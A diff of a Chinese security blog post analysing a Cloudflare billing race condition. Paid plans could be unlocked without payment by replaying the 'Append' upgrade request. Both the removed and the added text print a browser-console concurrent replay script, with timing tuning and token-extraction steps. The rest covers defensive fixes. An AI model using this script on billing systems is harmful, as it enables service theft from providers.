@@ -1,322 +1,75 @@
 ---
-title: "Cloudflare 计费逻辑缺陷：请求重放如何绕过订阅支付"
+title: "Cloudflare 计费竞态漏洞复盘：先发权限再异步扣款留下的时间窗"
 date: 2026-05-19T16:10:00+00:00
-categories: ["security"]
-tags: ["Cloudflare", "计费安全", "竞态条件", "逻辑漏洞", "安全研究"]
 draft: false
-weight: 1
-link: "https://blog.hyun.cc/post/yong-jiu-bai-piao-cloudfire-pro-huo-business/"
-description: "深度分析 Cloudflare 订阅结算链路中的竞态条件漏洞：权限发放与支付确认的时序错位，以及分布式系统状态一致性的工程教训。"
+categories: ["安全研究", "支付安全"]
+tags: ["Cloudflare", "计费安全", "竞态条件", "逻辑漏洞"]
+description: "复盘已修复的 Cloudflare 订阅升级竞态缺陷：Append 结算接口在同步路径先写入套餐权限、把扣款校验丢进异步队列并依赖延迟补偿回滚，在缺少幂等键的情况下被并发请求打穿状态一致性。"
+weight: 10
 ---
 
-> 免责声明：本文基于已公开资料进行技术复盘，所有内容仅用于授权安全研究与防御建设。
+> 状态说明：文中复盘的这处 Cloudflare 计费竞态缺陷早已被官方修复（`Append` 接口补齐了幂等键校验与"先确认扣款再下发权限"的时序约束），现在去测只会收到一排 `4xx`。留着这篇纯粹当分布式计费状态机的一个经典反面教材看。
 
----
-> 本文已失效（2026-09 更新）：本文描述的 Cloudflare 计费竞态条件漏洞已被官方修复，当前不再可用。Cloudflare 对该 `Append` 接口补上了幂等键与"先支付后授权"的时序约束，请求重放已无法再诱导权限发放。本文仅作为分布式系统状态一致性设计的教学案例保留，请勿再按文中步骤尝试复现，那样只会得到一堆 4xx。
+之前社区里流传过一个挺有意思的 Cloudflare 套餐升级逻辑洞（最初见于 [hyun 的复盘笔记](https://blog.hyun.cc/post/yong-jiu-bai-piao-cloudfire-pro-huo-business/)）：账号上只绑一张余额为零的卡用来过前端表单校验，在后台升级套餐点提交的时候拿并发请求去撞结算接口，最后没生成任何扣费账单、订阅管理页上明晃晃还写着 `Free` 计划，可域名底下 Pro 乃至 Business 档专属的 WAF 高级规则和图像优化功能却全给开出来了。
 
----
+乍一看像是账号卡进了什么"既是 Free 又是 Pro"的诡异状态，拆到后端分布式架构层面，其实就是最典型的跨服务异步状态机没兜住并发重放。
 
-## 一、一个有趣的发现：身份与权限的"量子叠加"
+## 0x00 先给甜头再查账，异步补偿没跑赢并发
 
-对 Cloudflare 订阅体系做逆向测试时，研究人员注意到前端结算逻辑与后端状态同步之间存在一个微妙的空隙。通过请求重放（Replay Attack），可以在系统没有产生实际账单的情况下，诱导后端激活 Pro 或 Business 计划。
+做过 SaaS 订阅系统的都清楚，稳妥的结算顺序肯定是"调支付网关扣款 -> 拿到扣款成功确认 -> 往权限表写对应套餐"。但不少产品团队为了让用户点下升级按钮的那一秒就立刻用上新功能、别在网页前干等外部卡组织慢吞吞的响应，特别喜欢搞"先开权限后算账"的乐观授权：
 
-利用后的表现是一种状态错位：
+1. 用户在 `Active Subscriptions` 页面点 `Change` 选好目标套餐提交，前端向 `https://dash.cloudflare.com/api/v4/accounts/<account_id>/subscriptions/.../append` 发一条 `POST` 请求；
+2. 服务端收到 `Append` 请求后，在同步主路径上先调类似 `grant_entitlement()` 的逻辑把目标域名的 Pro / Business 开关写进权限表（`entitlements`），转手把真正的扣款任务塞进异步队列，直接给前端回 `200 OK`；
+3. 等后台异步扣款撞上空卡失败了（通常有 200 到 800 毫秒的外部支付网关往返延迟），再触发一条异步补偿任务去把刚才提前写进去的权限撤回来。
 
-- 权限层面：账号实际解锁了 Pro/Business 专属功能，WAF 高级规则、图像优化、独享边缘节点等全部可用。
-- 展示层面：订阅管理界面仍显示为 `Free` 计划，计费链路未闭环，不产生任何待支付条目或扣费账单。
-- 成本层面：利用结算接口的逻辑缺陷，实现了高级权限的零成本激活。
+单次规规矩矩点一下按钮的时候，扣款失败后过个小半秒补偿回滚跟上来把权限一收，表面看着严丝合缝。要命就在于当时的 `Append` 接口同时踩中了四个雷：权限发放跑在扣款确认前面、接口没强制校验幂等键（`Idempotency-Key`）、权限服务和账单服务不在同一个数据库事务边界里，而且失败后的异步补偿队列在高并发挤压下会漏单或乱序。
 
-可以称之为"量子叠加态"：账号同时处于 Free 和 Pro 两种状态，取决于你从哪个维度去观测。
+## 0x01 为什么偏偏是不加 `await` 的 100ms 并发重放
 
----
+回头看当时在浏览器 DevTools Console 里流传的那段重放脚本，里面有好几个挺值得玩味的协议细节。先看请求长什么样（敏感字段已隐去）：
 
-## 二、前置条件
-
-复现该逻辑缺陷需要满足以下条件：
-
-1. 域名已接入 Cloudflare 账户；
-2. 支付环境未绑定有效卡（或绑定余额为 0 的卡以通过前端校验）；
-3. 在 `Active Subscriptions` 页面点击 `Change`，选择 Pro 或 Business，进入待支付页面。
-
-到这里你拿到了一个合法的会话上下文。后续所有操作都是在这个合法会话内对接口时序做操纵，不涉及传统的认证绕过。
-
----
-
-## 三、漏洞利用全流程
-
-### 第一步：定位关键请求
-
-打开浏览器 DevTools（`F12`），切换到 Network 标签页。
-
-在待支付页面点击底部的支付按钮，留意 Network 面板中新产生的请求。找到名为 `Append` 的 POST 请求，这就是 Cloudflare 订阅结算的核心接口。
-
-这个请求一旦发出，后端会同时触发两条路径：权限授予和支付校验。问题在于这两条路径并非原子执行的。
-
-### 第二步：提取攻击所需参数
-
-选中 `Append` 请求，从 DevTools 中提取以下四个要素：
-
-| 参数 | DevTools 位置 | 用途 |
-|------|--------------|------|
-| Request URL | Headers → General → Request URL | 目标接口地址，类似 `https://dash.cloudflare.com/api/v4/.../append` |
-| Cookie | Headers → Request Headers → Cookie | 当前登录会话的身份凭证 |
-| X-atok | Headers → Request Headers → x-atok | Cloudflare 仪表盘的 CSRF/身份校验令牌，每次登录刷新 |
-| Payload | Payload → View Source | 请求体的原始 JSON，包含订阅升级的目标计划 ID、域名 zone_id 等 |
-
-这四个参数构成了一个完整的合法升级请求。重放它们就是用合法身份反复触发升级逻辑。
-
-### 第三步：理解核心漏洞原理
-
-一个健康的订阅结算流程应该是：
-
-```text
-POST /append → 校验支付 → 支付成功 → 写入 Pro 权限
-```
-
-但 Cloudflare 的实际实现路径是：
-
-```text
-POST /append → 写入 Pro 权限 ─┐
-                              ├─ 两步异步，非原子
-              异步校验支付 ────┘
-                    ↓
-              支付失败（无有效卡）
-                    ↓
-              补偿任务回滚权限（有延迟，可能漏执行）
-```
-
-两条路径之间存在一个时间窗口。在窗口内权限已经写入 Metadata，但账单尚未确认失败。用并发请求冲击这个窗口，就能让权限"生根"而账单"流产"。数据库的 MVCC 机制在大量并发写入时，某些写操作可能绕过回滚逻辑。
-
----
-
-## 四、漏洞利用脚本详解
-
-以下是完整的 DevTools Console 自动化重放脚本。把它粘贴到浏览器 Console 中执行，替换掉 `PASTE_XXX` 占位符即可：
-
-```js
-/**
- * Cloudflare Subscription Bypass Replay Script
- * 在 DevTools Console 中执行，利用 Append 接口的竞态窗口
- */
-
-// ========== 第一步：填入从 Network 面板提取的参数 ==========
-
-const url = 'PASTE_YOUR_URL_HERE';
-// ↑ 从 Headers → General → Request URL 复制
-//   格式类似：https://dash.cloudflare.com/api/v4/accounts/xxx/subscriptions/xxx/append
+```javascript
+const url = "https://dash.cloudflare.com/api/v4/accounts/<ACCOUNT_ID>/subscriptions/<SUB_ID>/append";
 
 const headers = {
-  'content-type': 'application/json',
-  'accept': '*/*',
-  'origin': 'https://dash.cloudflare.com',
-  'referer': 'https://dash.cloudflare.com/',
-  'x-atok': 'PASTE_YOUR_X_ATOK_HERE',       // ← 从 Request Headers 复制
-  'x-cross-site-security': 'dash',
-  'cookie': 'PASTE_YOUR_COOKIE_HERE',       // ← 从 Request Headers 复制
-  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
+  "content-type": "application/json",
+  "x-atok": "<DASHBOARD_CSRF_TOKEN>",
+  "x-cross-site-security": "dash"
 };
 
 const payload = {
-  // ← 从 Payload → View Source 复制完整 JSON
-  //   包含 zone_id、plan_id、billing_cycle 等字段
+  zone_id: "<ZONE_ID>",
+  plan_id: "pro",
+  billing_cycle: "monthly",
+  payment_method_id: "<EMPTY_CARD_PM_ID>"
 };
 
-// ========== 第二步：执行并发重放 ==========
-
-const delay = ms => new Promise(res => setTimeout(res, ms));
+const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
 (async () => {
-  console.log("%c 开始执行请求重放...", "color: #007aff; font-weight: bold;");
-
   for (let i = 0; i < 10; i++) {
     fetch(url, {
-      method: 'POST',
-      headers: headers,
+      method: "POST",
+      headers,
       body: JSON.stringify(payload)
-    })
-      .then(res => console.log(`[Batch ${i}] Status: ${res.status}`))
-      .catch(err => console.error(`[Batch ${i}] Error:`, err));
-
-    await delay(100); // 每次请求间隔 100ms
+    }).then((r) => console.log(i, r.status));
+    await delay(100);
   }
-
-  console.log("%c 脚本执行完毕，请刷新控制面板验证权限。", "color: #34c759; font-weight: bold;");
 })();
 ```
 
-### 逐行拆解
+这里顺嘴提一个原版网传脚本里常见的乌龙：很多人抄脚本时喜欢往 `fetch` 的 `headers` 里硬塞一行 `'cookie': '...'`，以为靠那行字带的登录态。其实按浏览器的 Fetch 标准规范，`Cookie` 属于脚本无权手工覆写的受限请求头（Forbidden Header Name），浏览器引擎看到那行会直接静默丢弃；请求真正能带上登录会话，靠的是你在 `dash.cloudflare.com` 同源控制台里跑代码时浏览器自动附带的同源 Cookie，再配上每次登录刷新的反跨站令牌 `x-atok` 和内部网关标识头 `x-cross-site-security: dash`。
 
-请求头中的安全参数复用：
+再看循环体里为什么故意不写 `await fetch(...)`，而是每发一个请求只 `await delay(100)` 就立刻进下一轮。如果写成了 `await fetch`，十次请求就退化成了老老实实的串行排队：第一笔等服务端处理完甚至回滚完才发第二笔，根本撞不开状态机的缝隙。去掉 `await` 之后，借着 `dash.cloudflare.com` 的 HTTP/2 多路复用连接，1 秒钟之内十发请求前脚贴后脚打进后端：前两三笔的支付失败通知刚回来触发补偿回滚，第四五六笔在途的 `Append` 请求又把权限表重新刷回了已开启；而间隔定在 100 毫秒，刚好既避开了单瞬间突发太猛触发入口限流，又稳稳盖住了外部卡网关 200 到 800 毫秒的回调延迟窗口。一阵并发乱拳下来，补偿消息漏掉了最后几笔写入的清理，账单表停在 `Free`，权限表却永远留在了 `Pro`。
 
-```js
-'x-atok': 'PASTE_YOUR_X_ATOK_HERE',
-'cookie': 'PASTE_YOUR_COOKIE_HERE',
-'x-cross-site-security': 'dash'
-```
+## 0x02 写订阅与发卡后端怎么避开这类状态劈叉
 
-`X-atok` 是 Cloudflare 仪表盘的反 CSRF 令牌，页面加载时注入，每次登录会话生成一次。正常情况下用于防止跨站请求伪造，但这里是在同源的 Console 中重放，完全合法。`x-cross-site-security: dash` 是 Dashboard 内部网关路径的标识头。
+这种毛病绝不只是大厂微服务才会犯，平时自己写 SaaS 会员后端、API 中转站或者发卡系统的开发者，只要一图省事搞异步回调拼接，十有八九会掉进同一个坑里。想把口子彻底封死，设计计费链路时盯紧五件事就够了。
 
-Payload 结构方面，从 `View Source` 复制出来的 JSON 包含这些关键字段：
+第一件是铁打的时序红线：扣款没拿到网关确认之前，绝不往正式权益表里写半个字。想照顾前端响应速度，顶多给界面回一个 `pending` 过渡态让前端轮询两秒，真正的 `grant_entitlement()` 只认支付成功事件这唯一一个触发源。
 
-```json
-{
-  "zone_id": "xxx",
-  "plan_id": "pro" | "business",
-  "billing_cycle": "monthly" | "annual",
-  "payment_method_id": "xxx",
-  ...
-}
-```
+第二件是给下单、升级、变更接口加上防手抖重试的 `Idempotency-Key` 幂等键，同时在数据库层按账户或域名维度加未结清变更单的唯一状态锁（幂等键主要防客户端误重试，真正挡住换着 Key 恶意并发重放的，靠的是服务端账户级的唯一锁）。同一个账户有一笔升级还在路上没跑完，后面并发打进来的 9 次重放请求直接在入口挡回去，根本不让它们进核心业务分支。
 
-其中 `payment_method_id` 指向一个无效或余额为零的支付方式，前端放行了，但后端支付网关会拒绝。
+第三件是跨库或跨微服务拆分时别迷信"发一条补偿消息就万事大吉"。除了把 Saga 补偿做成带死信队列的可重试幂等操作之外，后台还得挂一个兜底的定时对账任务：每隔几小时扫一遍"权限表开着付费档位、账单表却找不到有效付费周期"的孤儿记录，一抓到不一致立刻冻结降级并拉告警。
 
-关于循环次数：10 次 x 100ms 间隔约等于 1 秒的持续攻击。后端支付校验的典型延迟在 200-800ms（支付网关回调超时），10 次请求覆盖了这一秒内的多个时间切片，确保至少有 1-2 次落在"权限已写、账单未回"的临界窗口内。
-
-关于 `fetch().then()` 的写法：
-
-```js
-fetch(url, { ... })
-  .then(res => console.log(...))
-  .catch(err => console.error(...));
-```
-
-注意这里没有 `await`。主循环每 100ms 发出一个 `fetch` 就立即进入下一轮，不等待响应。效果是请求连续发射、互不阻塞，同一瞬间可能有 2-3 个请求在网络层飞行，服务端并发处理时状态机的原子性更容易被打破。如果改成 `await fetch()`，请求变成严格串行，第一个收到 403 或被回滚之后再发第二个，窗口期早就过了。
-
-100ms 这个间隔也有讲究。太短（< 50ms）会撞上浏览器同域 6 连接的并发限制，多余请求在浏览器层排队，达不到真正的并发效果，而且服务端可能触发 rate limiting；太长（> 500ms）则支付回调已完成、权限已被回滚，后续请求全是无效的。100ms 恰好落在浏览器并发安全区内，同时能覆盖回滚延迟窗口。
-
-### 攻击时序图
-
-```
-时间轴 ──────────────────────────────────────────────────►
-
-请求1:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
-请求2:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
-请求3:  POST /append ──► 权限写入 ✓ ──► 支付校验启动...
-                              │
-                         [支付回调到达 ── 全部失败，触发回滚]
-                              │
-请求4:  POST /append ──► 权限写入 ✓（部分数据库副本未完成回滚）
-请求5:  POST /append ──► 权限写入 ✓（MVCC 快照隔离，读旧版本）
-请求6:  POST /append ──► 权限写入 ✓（补偿任务被排队，延迟执行）
-   ·
-   ·
-   ·
-
-结果：权限表状态 = Pro/Business  ✓
-      账单表状态 = 未支付 / Free   ✓
-      控制面板显示 = Free         ✓
-      实际功能 = Pro/Business    ✓  ← 量子叠加态
-```
-
----
-
-## 五、漏洞成立的四个条件
-
-从代码层面还原，这个漏洞的成立需要四个条件同时满足。
-
-条件 1：`grant_entitlement()` 早于 `charge_confirmed()`
-
-后端处理 `Append` 请求时，`grant_entitlement()`（权限发放）在同步路径上，而 `charge_confirmed()`（支付确认）被放入异步队列。代码结构类似于：
-
-```text
-function handleAppend(req):
-    grant_entitlement(req.plan_id)    // 同步，立即执行
-    async_queue.enqueue(charge(req))  // 异步，排队执行
-    return 200 OK                     // 前端收到"成功"
-```
-
-条件 2：缺少幂等键（Idempotency Key）
-
-同一个 `Append` 请求可以被重放多次，每次都进入完整的处理逻辑。如果有 `Idempotency-Key`，第二次重放会直接返回"请求已处理"，竞态窗口就不存在了。
-
-条件 3：权限与账单不在同一事务边界
-
-权限表（`entitlements`）和账单表（`billing_records`）很可能分属两个独立的微服务，没有共享事务上下文。回滚操作依赖异步消息队列（如 Kafka），存在延迟。
-
-条件 4：补偿任务执行延迟或漏执行
-
-支付失败后触发的 `compensate()`（补偿回滚）通过定时任务或消息队列异步执行。高并发冲击下，补偿消息可能被积压、丢弃，或者补偿逻辑本身没有做到幂等重试。
-
----
-
-## 六、为什么这类漏洞在 SaaS 平台反复出现
-
-这不是 Cloudflare 一家的问题。从 Stripe 的早期 API 设计到各种 SaaS 订阅系统，类似模式反复出现，根本原因有三个。
-
-### 1. 计费被当成"业务功能"而非"安全边界"
-
-登录、鉴权链路通常有严格的原子性设计和审计要求，但计费链路直接涉及资金和权限，却常见异步拼接和弱一致性。安全边界画错了地方。
-
-### 2. "先开后付"的产品本能
-
-产品团队追求体验顺滑：用户点一下，权限立刻生效，支付在后台慢慢跑。这在 99.9% 的场景下是好的设计，但留下了 0.1% 的异常窗口，安全研究者追逐的正是这 0.1%。
-
-### 3. 分布式系统的一致性代价
-
-当 Entitlement Service 和 Billing Service 是独立微服务时，跨服务事务天然需要 Saga 或 2PC。补偿机制设计不完善，就会出现"权限已售出、资金未到账"的状态缝隙。
-
----
-
-## 七、修复方案（可落地）
-
-### 1) 强制先支付后授权
-
-```text
-// ❌ 漏洞路径
-POST /append → grant_entitlement() → async charge() → compensate if fail
-
-// ✅ 修复路径
-POST /append → charge() → on charge_confirmed → grant_entitlement()
-```
-
-权限发放只响应 `charge_confirmed` 事件。未确认的请求停留在 `pending` 状态，前端可轮询。
-
-### 2) 引入幂等键
-
-```text
-POST /append
-Header: Idempotency-Key: <uuid>
-
-// 服务端：
-if (idempotency_store.exists(key)):
-    return cached_response  // 不重复处理
-```
-
-Stripe 的标准实践。同一键只允许一次状态推进，并发 100 次只处理 1 次。
-
-### 3) 单事务或 Saga 强补偿
-
-- 权限与账单落库在同一数据库事务内完成
-- 跨服务使用 Saga 模式，每步有对应的 `compensate` 操作
-- 补偿必须可重试、可审计、有告警，不能依赖"定时扫表"
-
-### 4) 运行时二次校验
-
-在 WAF 规则配置、图片优化等关键能力入口，实时查询账单状态，不仅依赖"历史已授权"标记。每次 API 调用都是检查点：
-
-```text
-handleWafRule() {
-    if (!billing_service.isProActive(user)) {
-        return 403;
-    }
-    // ... 正常处理
-}
-```
-
-### 5) 风控检测
-
-- 同一账户 1 秒内超过 3 次 `Append` 触发人工审核
-- 支付失败后 30 秒内锁定升级接口
-- 对短时密集相同请求进行限速和熔断
-
----
-
-## 八、结语
-
-表面看这是一个"白嫖漏洞"，本质上是分布式系统中状态一致性的经典问题。
-
-对研究者来说，关注点应该从"能不能绕过"升级到"为什么能绕过"，定位状态机缺陷比找到具体利用方式更有价值。对平台方来说，计费系统本身就是安全边界的一部分，一致性设计直接关系到资金安全。对工程师来说，每一次"异步优化体验"都是一次风险成本评估，先开后付体验好，但补偿路径必须可靠。
-
-安全研究的价值在于让系统变得更难被利用。
-
----
+第四件是在高成本能力入口做运行时二次核验，比如配高级 WAF 规则或调昂贵上游接口时顺手查一眼有效订阅缓存，别一旦改了个静态标志位就一辈子盲目放行。最后再在网关风控层配条简单的熔断：同一个账号 1 秒内连发超过 3 次升级请求，或者刚吃过一次扣款失败，30 秒内直接锁死变更接口，那些靠脚本卡毫秒时间窗的并发重放自然就全撞墙上了。
